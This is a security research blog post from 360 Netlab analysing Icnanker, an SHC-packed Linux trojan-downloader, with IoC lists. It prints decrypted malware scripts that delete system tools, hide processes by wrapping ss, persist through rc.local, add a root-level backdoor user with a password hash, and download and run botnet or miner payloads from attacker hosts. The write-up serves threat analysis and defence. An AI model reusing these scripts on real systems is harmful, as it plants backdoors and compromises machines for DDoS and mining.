<!DOCTYPE html>
<html lang="en">
<head>

    <title>Icnanker, a Linux Trojan-Downloader Protected by SHC</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=42b57cac00" />

    <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Icnanker, a Linux Trojan-Downloader Protected by SHC">
    <meta property="og:description" content="Background


On August 15, 2019, 360Netlab Threat Detecting System flagged an unknown ELF sample (5790dedae465994d179c63782e51bac1) which generated Elknot Botnet related network traffic. We manually took a look and noticed that it is a Trojan-Downloader which utilizes &quot;SHC (Shell script compiler)&quot; technique and propgrates through weak SSH credentials. The author appeared">
    <meta property="og:url" content="https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/">
    <meta property="og:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta property="article:published_time" content="2020-03-23T13:38:00.000Z">
    <meta property="article:modified_time" content="2020-03-23T13:53:46.000Z">
    <meta property="article:tag" content="Icnanker">
    <meta property="article:tag" content="en">
    <meta property="article:tag" content="SHC">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="DDoS">
    <meta property="article:tag" content="Import 2022-11-30 11:16">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Icnanker, a Linux Trojan-Downloader Protected by SHC">
    <meta name="twitter:description" content="Background


On August 15, 2019, 360Netlab Threat Detecting System flagged an unknown ELF sample (5790dedae465994d179c63782e51bac1) which generated Elknot Botnet related network traffic. We manually took a look and noticed that it is a Trojan-Downloader which utilizes &quot;SHC (Shell script compiler)&quot; technique and propgrates through weak SSH credentials. The author appeared">
    <meta name="twitter:url" content="https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/">
    <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Alex.Turing">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Icnanker, en, SHC, Botnet, DDoS, Import 2022-11-30 11:16">
    <meta name="twitter:site" content="@360Netlab">
    <meta name="twitter:creator" content="@TuringAlex">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "url": "https://blog.netlab.360.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/06/turing.PNG",
            "width": 1200,
            "height": 1200
        },
        "url": "https://blog.netlab.360.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "Icnanker, a Linux Trojan-Downloader Protected by SHC",
    "url": "https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/",
    "datePublished": "2020-03-23T13:38:00.000Z",
    "dateModified": "2020-03-23T13:53:46.000Z",
    "keywords": "Icnanker, en, SHC, Botnet, DDoS, Import 2022-11-30 11:16",
    "description": "Background\n\n\nOn August 15, 2019, 360Netlab Threat Detecting System flagged an unknown ELF sample (5790dedae465994d179c63782e51bac1) which generated Elknot Botnet related network traffic. We manually took a look and noticed that it is a Trojan-Downloader which utilizes &quot;SHC (Shell script compiler)&quot; technique and propgrates through weak SSH credentials. The author appeared to be an old player Icnanker. Icnanker was exposed on the Internet in 2015 as a script programmer, who has a high-profile pers",
    "mainEntityOfPage": "https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/"
}
    </script>

    <meta name="generator" content="Ghost 5.76">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="db8c743e6bb1457403d255d83f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=42b57cac00"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=42b57cac00">
    <style type='text/css'>
	#ghost-portal-root {
        display: none;
    }
</style><style>:root {--ghost-accent-color: #eca265;}</style>

</head>
<body class="post-template tag-icnanker tag-en tag-shc tag-botnet tag-ddos tag-import-2022-11-30-11-16 has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <nav class="gh-head-inner inner">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://blog.netlab.360.com">
                        <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360" />
                </a>
                <div class="gh-head-brand-wrapper">
                    <button class="gh-search" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <a class="gh-burger" role="button">
                        <div class="gh-burger-box">
                            <div class="gh-burger-inner"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-botnet"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                        <a class="gh-social-link gh-social-twitter" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="me noopener"><svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
                        <a class="gh-social-link gh-social-feedly" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="me noopener"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
</a>
                </div>
            </div>
        </nav>
    </header>

    <div class="site-content">
             <div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://blog.netlab.360.com">
                <img src="/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon" />
            <span>360 Netlab Blog - Network Security Research Lab at 360</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Icnanker, a Linux Trojan-Downloader Protected by SHC</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Icnanker%2C%20a%20Linux%20Trojan-Downloader%20Protected%20by%20SHC&amp;url=https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg>        </a>
    </div>
    <progress id="reading-progress" class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


  <main id="site-main" class="site-main">
    <article class="article post tag-icnanker tag-en tag-shc tag-botnet tag-ddos tag-import-2022-11-30-11-16 no-image ">

      <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
          <span class="post-card-primary-tag">
            <a href="/tag/icnanker/">Icnanker</a>
          </span>
        </div>

        <h1 class="article-title">Icnanker, a Linux Trojan-Downloader Protected by SHC</h1>


        <div class="article-byline">
          <section class="article-byline-content">

            <ul class="author-list">
              <li class="author-list-item">
                <a href="/author/alex/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
                </a>
              </li>
            </ul>

            <div class="article-byline-meta">
              <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a></h4>
              <div class="byline-meta-content">
                <time class="byline-meta-date" datetime=" 2020-03-23">Mar 23, 2020</time>
                <span class="byline-reading-time"><span class="bull">&bull;</span> 8 min read</span>
              </div>
            </div>

          </section>
        </div>


      </header>

      <section class="gh-content gh-canvas">
        <!--kg-card-begin: markdown--><h2 id="background">Background</h2>
<p>On August 15, 2019, 360Netlab Threat Detecting System flagged an unknown ELF sample (5790dedae465994d179c63782e51bac1) which generated Elknot Botnet related network traffic. We manually took a look and noticed that it is a Trojan-Downloader which utilizes &quot;SHC (Shell script compiler)&quot; technique and propgrates through weak SSH credentials. The author appeared to be an old player Icnanker. Icnanker was exposed on the Internet in 2015 as a script programmer, who has a high-profile personality and likes to leave his QQ number and name in his codes. The sample, in our opinion, was not much new and therefore we did not bother to write anything.</p>
<p>On March 12, 2020, IntezerLab twittered about a <a href="https://twitter.com/IntezerLabs/status/1238090121624379392?ref=blog.netlab.360.com">Icnanker</a> variant (6abe83ee8481b5ce0894d837eabb41df). They did not give much details and we figured it is probably worth writing down a few interesting features that we observed.</p>
<h2 id="overview">Overview</h2>
<p>Icnanker is the first Linux malware family we observed that uses <a href="https://github.com/neurobin/shc?ref=blog.netlab.360.com">SHC</a>. Its name is derived from the author's ID &quot;by icnanker&quot; in the script.</p>
<p>The current Icnanker samples can be divided into 2 categories according to their functions:</p>
<ul>
<li>
<p>Protector<br>
Protector is used to protect samples from being deleted. It is currently used to protect Mining service.</p>
</li>
<li>
<p>Downloader<br>
Downloader is mainly used to facilitate DDos and Mining attacks. Currently its samples include Elknot Botnet, Xor Botnet and XMRMiner. On Icnanker-related HFS servers, we can see that the current download volume is at 20,114, and about 500 increment per day.<br>
<a href="https://blog.netlab.360.com/content/images/2020/03/shc_hfs-3.png"><img src="https://blog.netlab.360.com/content/images/2020/03/shc_hfs-3.png" class="kg-image"></a><br>
The main functions of Downloader are:</p>
</li>
<li>
<p>Persistence</p>
</li>
<li>
<p>Hide itself</p>
</li>
<li>
<p>Delete system command</p>
</li>
<li>
<p>Add new users</p>
</li>
<li>
<p>Download and execute specific samples</p>
</li>
</ul>
<h2 id="reverseanalysis">Reverse analysis</h2>
<p>Let's take a look at the following two samples.<br>
<mark>187fa428ed44f006df0c8232be4a6e4e</mark> Miner Protector,<br>
<mark>5790dedae465994d179c63782e51bac1</mark> Elknot Botnet Downloader.</p>
<blockquote>
<p>MD5:5790dedae465994d179c63782e51bac1</p>
<p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=8368ecf43c311327ed1b8e011f25b87ceef7f065, stripped</p>
<p>Packer: No</p>
<p><strong>Verdict:Malicious,Downloader</strong></p>
</blockquote>
<blockquote>
<p>187fa428ed44f006df0c8232be4a6e4e<br>
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped</p>
<p>Packer:No</p>
<p><strong>Verdict:Malicious,Protector</strong></p>
</blockquote>
<p>We know on the Windows platform, there is a technology for packaging BAT scripts into executable files, which is called Bat2Exe. Similarly, on the Linux platform,there is an open source &quot;SHC (Shell script compiler)&quot; that packs shell scripts into executable files. SHC uses the RC4 algorithm to encrypt the original script. The ELF file generated by it has very obvious characteristics: the RC4 decryption function is called a total of 14 times,and there are many unique strings. Security researchers can tell fairly easily whether ELF is generated by SHC.</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/03/shc_flag.png"><img src="https://blog.netlab.360.com/content/images/2020/03/shc_flag.png" class="kg-image"></a><br>
As mentioned above, we can use the RC4 algorithm to manually extract the original script. (Another option is to use <a href="https://github.com/yanncam/UnSHc?ref=blog.netlab.360.com">UnSHc</a> to directly decrypt the script)</p>
<pre><code class="language-bash">[*] Extracting each args address and size for the 14 arc4() calls with address [0x8048f65]...
	[0] Working with var address at offset [0x80ed087] (0x2a bytes)
	[1] Working with var address at offset [0x80ed0df] (0x1 bytes)
                            ...............
	[12] Working with var address at offset [0x80f1280] (0x13 bytes)
	[13] Working with var address at offset [0x80f12b1] (0x13 bytes)
[*] Extracting password...
	[+] PWD address found : [0x80f12ed]
	[+] PWD size found : [0x100]
[*] Executing [/tmp/kjGnQn] to decrypt [5790dedae465994d179c63782e51bac1]
[*] Retrieving initial source code in [5790dedae465994d179c63782e51bac1.sh]
[*] All done!
                            ...............
[*] Executing [/tmp/GRsVsP] to decrypt [187fa428ed44f006df0c8232be4a6e4e]
[*] Retrieving initial source code in [187fa428ed44f006df0c8232be4a6e4e.sh]
[*] All done!


</code></pre>
<h3 id="protector187fa428ed44f006df0c8232be4a6e4esh">Protector (187fa428ed44f006df0c8232be4a6e4e.sh)</h3>
<pre><code>#!/bin/bash
cp -f /usr/bin/chattr /usr/bin/lockr
cp -f /usr/bin/chattr /usr/bin/.locks
cp -f /usr/bin/.locks /usr/bin/lockr
chmod 777 /usr/bin/lockr
chmod 777 /usr/bin/.locks
lockr +i /usr/bin/lockr &gt;/dev/null 2&gt;&amp;1
lockr +i /usr/bin/.locks &gt;/dev/null 2&gt;&amp;1
.locks -i /usr/bin/lockr;chmod 777 /usr/bin/lockr
lockr +i /usr/bin/lockr &gt;/dev/null 2&gt;&amp;1
cp -f /usr/bin/lsattr /usr/bin/lockrc
cp -f /usr/bin/lsattr /usr/bin/.locksc
cp -f /usr/bin/.locksc /usr/bin/lockrc
chmod 777 /usr/bin/lockrc
chmod 777 /usr/bin/.locksc
lockr +i /usr/bin/lockrc &gt;/dev/null 2&gt;&amp;1
lockr +i /usr/bin/.locksc &gt;/dev/null 2&gt;&amp;1
.locks -i /usr/bin/lockrc;chmod 777 /usr/bin/lockrc
lockr +i /usr/bin/lockrc &gt;/dev/null 2&gt;&amp;1
rm -rf /usr/bin/lsattr
rm -rf /usr/bin/chattr
lockr +a /var/spool/cron/crontabs/root
lockr +i /var/spool/cron/crontabs/root
lockr +a /var/spool/cron/root
lockr +i /var/spool/cron/root
lockr +i /usr/lib/.cache/
lockr +i /usr/lib/.cache
rm -f $0
</code></pre>
<p>In this script, we can clearly see that the system commands chattr, lsattr are renamed and deleted, and the directory .cache, where mining script located,is protected, and the immutable attribute is enabled to prevent from being deleted.</p>
<h3 id="downloader5790dedae465994d179c63782e51bac1sh">Downloader (5790dedae465994d179c63782e51bac1.sh)</h3>
<pre><code class="language-bash">    －－－－－－－－－－－－from 5790dedae465994d179c63782e51bac1.sh－－－－－－－－－－
                ...............
    echo &quot;byicnanker 2228668564&quot; &gt; $Config
	tempfile=`cat $Config | awk '{print $1}'`
	filetemp=&quot;/usr/bin/$tempfile&quot; #现马的路径
	filename=`date +%s%N | md5sum | head -c 10`
	filepath=&quot;/usr/bin/$filename&quot; #新马的路径
	tempbash=`cat $Config | awk '{print $2}'`
	bashtemp=&quot;/usr/bin/$tempbash&quot; #现脚本路径
	bashname=`date +%s%N | md5sum | head -c 10`
	bashpath=&quot;/usr/bin/$bashname&quot; #新脚本路径
               ...............
</code></pre>
<p>This section has a typical icnanker marks, we can clearly see the icnanker logo, QQ, Chinese annotations, etc.</p>
<p>Since the script is in plain text, the functions are clear at a glance, and there are mainly 5 functions.</p>
<ul>
<li>Persistence, self-starting via re.local.</li>
</ul>
<pre><code>  # by icnanker -----------------------------------------------
  Repeatstart=`cat /etc/rc.local | grep 'start'| wc -l`
  if [ $Repeatstart != 1 ];then
  	lockr -i /etc/rc.local;sed -i '/start/d' /etc/rc.local
  fi
  if [ -z &quot;`cat /etc/rc.local | grep &quot;$bashtemp&quot;`&quot; ]; then
  	if [ -z &quot;`cat /etc/rc.local | grep &quot;$exit0&quot;`&quot; ]; then
  		lockr -i /etc/;lockr -i /etc/rc.local
  		echo &quot;$bashpath start&quot; &gt;&gt; /etc/rc.local
  	else
  		lockr -i /etc/;lockr -i /etc/rc.local
  		sed -i &quot;s|exit 0|$bashpath start|&quot; /etc/rc.local
  		echo &quot;exit 0&quot;&gt;&gt;/etc/rc.local
  	fi
  fi
</code></pre>
<ul>
<li>Self-hiding , so that management tools such as ss, ps, netstat cannot detect the process and network connections related to the sample.</li>
</ul>
<pre><code>if [ -f /bin/ss ];then
	if [ ! -f &quot;$iss&quot; ];then
		if [ ! -f &quot;$issbak&quot; ];then
			lockr -i /usr/bin/;mkdir /usr/bin/dpkgd/
			cp -f /bin/ss $issbak
			cp -f /bin/ss $iss
		else
			cp -f $issbak $iss
		fi
		chmod 777 $iss;chmod 777 $issbak
		lockr +i $issbak &gt;/dev/null 2&gt;&amp;1
		lockr +i $iss &gt;/dev/null 2&gt;&amp;1
	else
		if [ ! -f &quot;$issbak&quot; ];then
			lockr -i /usr/bin/;cp -f $iss $issbak
			lockr +i $issbak &gt;/dev/null 2&gt;&amp;1
		fi	
		if [ -z &quot;`cat /bin/ss | grep $Address`&quot; ]; then
			lockr -i /bin/;lockr -i /bin/ss
			echo '#!/bin/sh' &gt; /bin/ss
			echo 'iss|grep -v &quot;'$Address'&quot;' &gt;&gt; /bin/ss
			echo 'exit' &gt;&gt; /bin/ss
			chmod 777 /bin/ss;lockr +i /bin/ss &gt;/dev/null 2&gt;&amp;1
		fi
	fi
fi

</code></pre>
<ul>
<li>Delete some system files to increase the difficulty for repair.</li>
</ul>
<pre><code>lockr -i /usr/bin/;
lockr -i /usr/bin/wget;
rm -f /usr/bin/wget;
lockr -i /usr/bin/chattr;
rm -f /usr/bin/chattr
</code></pre>
<ul>
<li>Add new user (ntps) to facilitate subsequent control of the victim's machine</li>
</ul>
<pre><code>  # by icnanker -----------------------------------------------
  if [ -z &quot;`cat /etc/passwd|grep &quot;ntps&quot;`&quot; ]; then
  	lockr -i /etc/;lockr -i /etc/passwd #ntps
  	echo 'ntps:x:0:1:ntps:/root:/bin/bash' &gt;&gt; /etc/passwd
  	lockr -i /etc/;lockr +i /etc/passwd &gt;/dev/null 2&gt;&amp;1
  fi
  if [ -z &quot;`cat /etc/shadow|grep &quot;ntps&quot;`&quot; ]; then
  	lockr -i /etc/;lockr -i /etc/shadow #tianyong
  	echo 'ntps:$6$J6RdL6Xh$udhpd5iErOxXyZSERCi0NOtoXE9J095xDRo4DJfCoTEsImcxype6iltDL8pTG7w/7Gbp9Ohrii9O.4NnxqG/h.:16583:0:99999:7:::' &gt;&gt; /etc/shadow
  	lockr -i /etc/;lockr +i /etc/shadow &gt;/dev/null 2&gt;&amp;1
  fi
</code></pre>
<ul>
<li>Download and execute specific samples, here it downloads the Elknot Botnet.</li>
</ul>
<pre><code>  # by icnanker -----------------------------------------------
  iptable=`iptables -L INPUT | grep &quot;$Address&quot; | grep 'ACCEPT'`
  if [ -z &quot;$iptable&quot; ];then
  	iptables -I INPUT -s $Address -j ACCEPT
  else
  	iptables -D INPUT -s $Address -j DROP
  fi
  process=`ips -ef | grep &quot;$tempfile&quot; | grep -v &quot;grep&quot; | wc -l`
  if [ $process != 1 ];then
  	if [ ! -f &quot;$filebak&quot; ];then
  		lockr -i /usr/bin/;lockr -i /usr/bin/htrdpm;rm -f /usr/bin/htrdpm
  		cd /usr/bin/;dget http[://hfs.ubtv.xyz:22345/htrdpm
  		cd $path;mv -f /usr/bin/htrdpm $filepath
  	else
  		cp -f $filebak $filepath
  	fi
  	Runkillallconnect
  	chmod 777 $filepath
  	nohup $filepath &gt;/dev/null 2&gt;&amp;1 &amp;
  fi
</code></pre>
<p>At this point, Icnanker will load itself when system boots and maintain continuously control of the victim secretly.  At the same time, Icnanker has pretty flexible configuration. When migrating from one service to another, the author only needs to update the dns settings in the scripts.</p>
<p>Take the <strong>Elknot and Miner</strong> as examples</p>
<pre><code>elknot

ResolveIP=`nslookup [ddd.ubtv.xyz|grep &quot;Address: &quot;|awk '{print $2}'`
if [ -z &quot;$ResolveIP&quot; ];then
	lockr -i /etc/;lockr -i /etc/resolv.conf
	echo 'nameserver 114.114.114.114' &gt; /etc/resolv.conf
	echo 'nameserver 8.8.8.8' &gt;&gt; /etc/resolv.conf
	echo 'nameserver 8.8.4.4' &gt;&gt; /etc/resolv.conf
	lockr +i /etc/resolv.conf &gt;/dev/null 2&gt;&amp;1
	service network restart;sleep 1
	Address=`nslookup ddd.ubtv.xyz|grep &quot;Address: &quot;|awk '{print $2}'`
else
	Address=&quot;$ResolveIP&quot;
fi
 dget http[://hfs.ubtv.xyz:22345/htrdpm

-------------------------------------------VS----------------------------------------

miner

ResolveIP=`nslookup p[ool.supportxmr.com|grep &quot;Address: &quot;|awk '{print $2}'`
if [ -z &quot;$ResolveIP&quot; ];then
	lockr -i /etc/;lockr -i /etc/resolv.conf
	echo 'nameserver 114.114.114.114' &gt; /etc/resolv.conf
	echo 'nameserver 8.8.8.8' &gt;&gt; /etc/resolv.conf
	echo 'nameserver 8.8.4.4' &gt;&gt; /etc/resolv.conf
	lockr +i /etc/resolv.conf &gt;/dev/null 2&gt;&amp;1
	service network restart;sleep 1
	Address=`nslookup p[ool.supportxmr.com|grep &quot;Address: &quot;|awk '{print $2}'`
else
	Address=&quot;$ResolveIP&quot;
fi
 dget http[://xz.jave.xyz:22345/.xm
</code></pre>
<p>Here is a list of Downloader and theirs services currently we observed.</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>md5</th>
<th>payload type</th>
<th>payload url</th>
</tr>
</thead>
<tbody>
<tr>
<td>80</td>
<td>5790dedae465994d179c63782e51bac1</td>
<td>elknot botnet</td>
<td>http[://hfs.ubtv.xyz:22345/htrdpm</td>
</tr>
<tr>
<td>.ds1;.ds2</td>
<td>6abe83ee8481b5ce0894d837eabb41df</td>
<td>miner</td>
<td>http[://xz.jave.xyz:22345/.xm</td>
</tr>
<tr>
<td>.ssh</td>
<td>89cd1ebfa5757dca1286fd925e0762de</td>
<td>elknot botnet</td>
<td>http[://hfs.ubtv.xyz:22345/htrdpm</td>
</tr>
<tr>
<td>19880</td>
<td>d989e81c4eb23c1e701024ed26f55849</td>
<td>elknot botnet</td>
<td>http[://hfs.ubtv.xyz:22345/htrdps</td>
</tr>
</tbody>
</table>
<h2 id="icnankersdistributedsamples">Icnanker's distributed samples</h2>
<p>Icnanker's distributed samples are all stored on its HFS server, and from what we have seen so far, all samples are the typical botnet families: Elknot Botnet, Xor Botnet, and XMR mining service.</p>
<ul>
<li>
<p>Elknot Botnet</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>md5</th>
<th>c2</th>
</tr>
</thead>
<tbody>
<tr>
<td>htrdps</td>
<td>5c90bfbae5c030da91c9054ecb3194b6</td>
<td>ubt.ubtv.xyz:19880, jav.jave.xyz:6001</td>
</tr>
<tr>
<td>kcompact0</td>
<td>eec19f1639871b6e6356e7ee05db8a94</td>
<td>sys.jave.xyz:1764, jav.jave.xyz:6001</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>Xor.DDoS Botnet</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>md5</th>
<th>c2</th>
</tr>
</thead>
<tbody>
<tr>
<td>ss</td>
<td>0764da93868218d6ae999ed7bd66a98e</td>
<td>8uch.jave.xyz:3478,8uc1.jave.xyz:1987,8uc2.ubtv.xyz:2987</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>Miner</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>md5</th>
<th>c2</th>
</tr>
</thead>
<tbody>
<tr>
<td>sh</td>
<td>17ac3bd2753b900367cb9ee4068fe0c1</td>
<td></td>
</tr>
<tr>
<td>.xm</td>
<td>765a0899cb87400e8a27ab572f3cdd61</td>
<td></td>
</tr>
</tbody>
</table>
</li>
</ul>
<h2 id="suggestions">Suggestions</h2>
<p>We recommend that users watch for the clues we mentioned above and block the C2 on their networks,<br>
We also suggest strong login credentials should always be enforced.</p>
<h2 id="contactus">Contact us</h2>
<p>Readers are always welcomed to reach us on <a href="https://twitter.com/360netlab?ref=blog.netlab.360.com">twitter</a>, or email to netlab at 360 dot cn.</p>
<h2 id="ioclist">IoC list</h2>
<h3 id="samplemd5">Sample MD5</h3>
<pre><code>5790dedae465994d179c63782e51bac1
6abe83ee8481b5ce0894d837eabb41df
89cd1ebfa5757dca1286fd925e0762de
d989e81c4eb23c1e701024ed26f55849
5c90bfbae5c030da91c9054ecb3194b6
eec19f1639871b6e6356e7ee05db8a94
0764da93868218d6ae999ed7bd66a98e
17ac3bd2753b900367cb9ee4068fe0c1
765a0899cb87400e8a27ab572f3cdd61
187fa428ed44f006df0c8232be4a6e4e
</code></pre>
<h3 id="cc">CC</h3>
<pre><code>ubt.ubtv.xyz:19880 #Elknot
sys.jave.xyz:1764  #Elknot
jav.jave.xyz:6001  #Elknot
8uch.jave.xyz:3478 #Xor.DDoS
8uc1.jave.xyz:1987 #Xor.DDoS
8uc2.ubtv.xyz:2987 #Xor.DDoS
xz.jave.xyz:22345  #Icnanker HFS
</code></pre>
<!--kg-card-end: markdown-->
      </section>



      <div id="disqus_thread" class="disqus-comments gh-canvas"></div>
      <script>
        var disqus_config = function () {
          this.page.url = "https://blog.netlab.360.com/icnanker-trojan-downloader-shc-en/";
          this.page.identifier = "ghost-5e7823267646030007b269e5"
        };
        (function () {
          var d = document, s = d.createElement('script');
          s.src = 'https://blog-netlab-360.disqus.com/embed.js';
          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    </article>

  </main>


    <aside class="read-more-wrap outer">
